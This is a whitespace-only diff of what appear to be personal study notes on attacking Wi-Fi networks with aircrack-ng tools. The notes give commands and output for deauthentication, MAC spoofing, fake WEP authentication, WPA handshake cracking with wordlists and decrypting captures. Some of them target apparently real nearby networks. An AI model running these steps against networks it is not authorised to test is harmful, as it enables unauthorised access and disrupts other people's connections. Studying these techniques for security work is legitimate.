@@ -8,7 +8,7 @@ wlan0     Scan completed :
           Cell 01 - Address: C4:E9:84:84:25:5E
                     Channel:3
                     Frequency:2.422 GHz (Channel 3)
-                    Quality=32/70  Signal level=-78 dBm  
+                    Quality=32/70  Signal level=-78 dBm
                     Encryption key:on
                     ESSID:"Rokeya"
                     Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
@@ -35,7 +35,7 @@ wlan0     Scan completed :
                     IE: Unknown:      Cell 02 - Address: C8:3A:35:52:9B:30
                     Channel:7
                     Frequency:2.442 GHz (Channel 7)
-                    Quality=33/70  Signal level=-77 dBm  
+                    Quality=33/70  Signal level=-77 dBm
                     Encryption key:on
                     ESSID:"Qubee Indore"
                     Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 18 Mb/s
@@ -61,7 +61,7 @@ wlan0     Scan completed :
           Cell 03 - Address: C8:3A:35:52:9A:D8
                     Channel:10
                     Frequency:2.457 GHz (Channel 10)
-                    Quality=24/70  Signal level=-86 dBm  
+                    Quality=24/70  Signal level=-86 dBm
                     Encryption key:on
                     ESSID:"Raqibul"
                     Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 18 Mb/s
@@ -91,13 +91,13 @@ wlan0     Scan completed :
 iwconfig wlan0 essid "masumasus"
 
  iwconfig wlan0
-wlan0     IEEE 802.11bgn  ESSID:"masumasus"  
-          Mode:Managed  Frequency:2.462 GHz  Access Point: 54:A0:50:CC:53:FD   
-          Bit Rate=65 Mb/s   Tx-Power=15 dBm   
+wlan0     IEEE 802.11bgn  ESSID:"masumasus"
+          Mode:Managed  Frequency:2.462 GHz  Access Point: 54:A0:50:CC:53:FD
+          Bit Rate=65 Mb/s   Tx-Power=15 dBm
           Retry  long limit:7   RTS thr:off   Fragment thr:off
           Encryption key:off
           Power Management:off
-          Link Quality=69/70  Signal level=-41 dBm  
+          Link Quality=69/70  Signal level=-41 dBm
           Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
           Tx excessive retries:0  Invalid misc:9   Missed beacon:0
 
@@ -117,7 +117,7 @@ wlan0		Atheros AR9285	ath9k - [phy0]
 Found 4 processes that could cause trouble.
 If airodump-ng, aireplay-ng or airtun-ng stops working after
 a short period of time, you may want to kill (some of) them!
--e 
+-e
 PID	Name
 4155	NetworkManager
 9603	wpa_supplicant
@@ -135,7 +135,7 @@ wlan0		Atheros AR9285	ath9k - [phy0]SIOCSIFFLAGS: Name not unique on network
 
 				(monitor mode enabled on mon0)
 
- ⚡ 2010 [10:14 PM]  /home/masum   master ●   
+ ⚡ 2010 [10:14 PM]  /home/masum   master ●  
  ⚡ 2010 [10:14 PM]  /home/masum   master ●   airmon-ng
 
 
@@ -155,13 +155,13 @@ wlan0		Atheros AR9285	ath9k - [phy0]
 ... also if we want to see beacon frame inside in management frame we do the following
 ... (wlan.fc.type == 0) && (wlan.fc.subtype == 8).
 
-... now we want to see how many wireless access point we have around so we run 
-... the following 
+... now we want to see how many wireless access point we have around so we run
+... the following
 
 airodump-ng wlan0
 
-... after founding the ap mac address we are trying to connect that ap. note 
-... here we have to set our wlan card channel to the same of the ap. to do so 
+... after founding the ap mac address we are trying to connect that ap. note
+... here we have to set our wlan card channel to the same of the ap. to do so
 ... we do the following.
 
 iwconfig wlan0 channel 1
@@ -170,10 +170,10 @@ iwconfig wlan0 channel 1
 
 airodump-ng --bssid C4:E9:84:90:F1:76 wlan0mon
 
-... and the wireshark filter will be wlan.bssid == C4:E9:84:90:F1:76 
-... and to see the data packets our wireshark filter will be 
+... and the wireshark filter will be wlan.bssid == C4:E9:84:90:F1:76
+... and to see the data packets our wireshark filter will be
 ... (wlan.bssid == 00:21:91:d2:8e:25) && (wlan.fc.type_subtype == 0x20)
-... and for the beacon packets only 
+... and for the beacon packets only
 ... (wlan.bssid == 00:21:91:d2:8e:25) && !(wlan.fc.type_subtype == 0x20)
 
 ... now we will try to inject some packets to our targated ap by following
@@ -183,7 +183,7 @@ aireplay-ng -9 -e "SL-INTERNET-ALIM" -a EC:08:6B:E9:6E:06 wlan0mon --ignore-nega
 15:48:32  Waiting for beacon frame (BSSID: EC:08:6B:E9:6E:06) on channel -1
 15:48:32  Trying broadcast probe requests...
 15:48:32  Injection is working!
-15:48:34  Found 1 AP 
+15:48:34  Found 1 AP
 
 15:48:34  Trying directed probe requests...
 15:48:34  EC:08:6B:E9:6E:06 - channel: 1 - 'SL-INTERNET-ALIM'
@@ -194,7 +194,7 @@ aireplay-ng -9 -e "SL-INTERNET-ALIM" -a EC:08:6B:E9:6E:06 wlan0mon --ignore-nega
 ... attack. we do the following. the air is to find out the name of the hidden
 ... ssid. the logic behind is when the client recieve the deauthentication packets
 ... they will try to connect with the ap again. when connecting the hidden ap
-... will include its ssid name in the packets. in previous we had only the mac 
+... will include its ssid name in the packets. in previous we had only the mac
 ... address of the ap.
 
 aireplay-ng -0 5 -a EC:08:6B:E9:6E:06 wlan0mon --ignore-negative-one
@@ -218,10 +218,10 @@ a connected wireless client (-c <client's mac>).
 
 aireplay-ng -0 5 -a EC:08:6B:E9:6E:06 wlan0mon --ignore-negative-one
 
- CH 11 ][ Elapsed: 28 s ][ 2017-04-29 16:47 ][ fixed channel wlan0mon: -1                                         
+ CH 11 ][ Elapsed: 28 s ][ 2017-04-29 16:47 ][ fixed channel wlan0mon: -1
  BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
- EC:08:6B:E9:6E:06  -77   0      289     1787   54   1  54e. WPA2 CCMP   PSK  SL-INTERNET-ALIM      
- EC:08:6B:E9:6E:06  B0:47:BF:2F:96:FA   -1    1e- 0      0     1778  
+ EC:08:6B:E9:6E:06  -77   0      289     1787   54   1  54e. WPA2 CCMP   PSK  SL-INTERNET-ALIM
+ EC:08:6B:E9:6E:06  B0:47:BF:2F:96:FA   -1    1e- 0      0     1778
 
 ... now we can change the mac by using macchanger and try to connect to the ap.
 
@@ -239,7 +239,7 @@ airodump-ng mon0 -c 11 --bssid 00:21:91:D2:8E:25 -w keystream
 ... we can connect to the access point by following command without knowing
 ... the actual key itself.
 
-aireplay-ng -1 0 -e Wireless Lab -y keystream-01-00-21-91-D2-8E-25.xor -a 00:21:91:D2:8E:25 -h aa:aa:aa:aa:aa:aa mon0 
+aireplay-ng -1 0 -e Wireless Lab -y keystream-01-00-21-91-D2-8E-25.xor -a 00:21:91:D2:8E:25 -h aa:aa:aa:aa:aa:aa mon0
 
 ... when cracking wep key related authentication we need to run airodump-ng
 ... , aireply-ng and aircrack-ng all together on three different terminal.
@@ -261,7 +261,7 @@ aircrack-ng keystream.cap
 ... nounce, source nounce, source mac ,ap mac and finally pre-shared key is then used to encrypt the data between
 ... client and access-point.
 
-... all of these parameters except preshared key can be found by sniffing the air. 
+... all of these parameters except preshared key can be found by sniffing the air.
 ... preshared key is the combination of pass-phrase supplied by user along with the ssid of
 ... ap is then transmitted through pbkdf2 is a result of 256bit of key.
 
@@ -288,10 +288,10 @@ Read 1335 packets.
 ... cracking wpa/wpa2 key solely depends on if the key is present in the packet capture
 ... file pcap file. also it depends on the word list we are using.
 
-... speeding up the cracking using genpmk and cowpatty. 
+... speeding up the cracking using genpmk and cowpatty.
 ... as we know pre shared key is combination of pass phrase given by client and ssid.
-... we can generate the preshared key also know as pairwise master key pmk with our 
-... word list and ssid. 
+... we can generate the preshared key also know as pairwise master key pmk with our
+... word list and ssid.
 
 root@bd# genpmk -f /usr/share/john/password.lst -d PrePMK -s "Rokeya"
 
@@ -300,15 +300,15 @@ root@bd# ls
 
 ... we can now use the PrePMK with cowpatty to crack wpa/wpa2.
 
-root@bd# cowpatty -d PrePMK -s "Rokeya" -r crack-01.cap 
+root@bd# cowpatty -d PrePMK -s "Rokeya" -r crack-01.cap
 
 cowpatty 4.6 - WPA-PSK dictionary attack. <jwright@hasborg.com>
 
 End of pcap capture file, incomplete four-way handshake exchange.  Try using a
 different capture.
 
-... we can also use this genpmk compitable database PrePMK to aircrack-ng. to 
-... do so we need another tools airolib-ng to convert genpmk dB to aircrack-ng 
+... we can also use this genpmk compitable database PrePMK to aircrack-ng. to
+... do so we need another tools airolib-ng to convert genpmk dB to aircrack-ng
 ... db.
 
 
@@ -323,7 +323,7 @@ different capture.
 
        --stats        : Output information about the database.
        --sql <sql>    : Execute specified SQL statement.
-       --clean [all]  : Clean the database from old junk. 'all' will also 
+       --clean [all]  : Clean the database from old junk. 'all' will also
                         reduce filesize if possible and run an integrity check.
        --batch        : Start batch-processing all combinations of ESSIDs
                         and passwords.
@@ -345,7 +345,7 @@ Reading header...
 Reading...
 Updating references...
 Writing...
- 
+
 ... now we can use the PrePMK-aircrack pmk database which is compitable with
 ... aircrack. like following.
 
@@ -365,7 +365,7 @@ Parsed 64 packets (64 802.11-packets), got 1 AP(s)
 
 No suitable AccessPoint with that ESSID in the capture file.
 
-... the cap file we have found during our scanning can be used to decrypt using 
+... the cap file we have found during our scanning can be used to decrypt using
 ... airdecap-ng like below.
 
  # airdecap-ng -w abcdefgh crack-01.cap
@@ -374,9 +374,9 @@ No suitable AccessPoint with that ESSID in the capture file.
 ... we are viewing only the first 10 lines of the files.
 
  # tshark -r crack-01.cap -c 10
- 
+
 tshark: Lua: Error during loading:
- [string "/usr/share/wireshark/init.lua"]:46: dofile has been disabled due to running Wireshark as superuser. 
+ [string "/usr/share/wireshark/init.lua"]:46: dofile has been disabled due to running Wireshark as superuser.
  See http://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.
   1   0.000000 Tp-LinkT_84:25:5e -> Broadcast    802.11 313 Beacon frame, SN=3677, FN=0, Flags=........, BI=100, SSID=Rokeya
   2   0.526400 Tp-LinkT_84:25:5e -> ChinaPal_75:60:05 EAPOL 133 Key (Message 1 of 4)
@@ -394,13 +394,13 @@ tshark: Lua: Error during loading:
  # iwconfig wlan0 essid "masumasus" key abcdef
 
  # iwconfig wlan0
-wlan0     IEEE 802.11bgn  ESSID:"masumasus"  
-          Mode:Managed  Frequency:2.412 GHz  Access Point: 54:A0:50:CC:53:FD   
-          Bit Rate=1 Mb/s   Tx-Power=14 dBm   
+wlan0     IEEE 802.11bgn  ESSID:"masumasus"
+          Mode:Managed  Frequency:2.412 GHz  Access Point: 54:A0:50:CC:53:FD
+          Bit Rate=1 Mb/s   Tx-Power=14 dBm
           Retry  long limit:7   RTS thr:off   Fragment thr:off
           Encryption key:off
           Power Management:off
-          Link Quality=57/70  Signal level=-53 dBm  
+          Link Quality=57/70  Signal level=-53 dBm
           Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
           Tx excessive retries:0  Invalid misc:8   Missed beacon:0
 
@@ -420,13 +420,10 @@ wlan0     IEEE 802.11bgn  ESSID:"masumasus"
 	psk="abcdefgh"
    }
 
-2. now we will use this conf file with the command wpa_supplicant 
+2. now we will use this conf file with the command wpa_supplicant
 
  # wpa_supplicant -Dwest -i wlan0 -c masum.conf
  # dhclient wlan0
 
 3. after succesful connection with the network we can request dhcp ip from the
 ... router using dhclient wlan0 command.
-
-
-
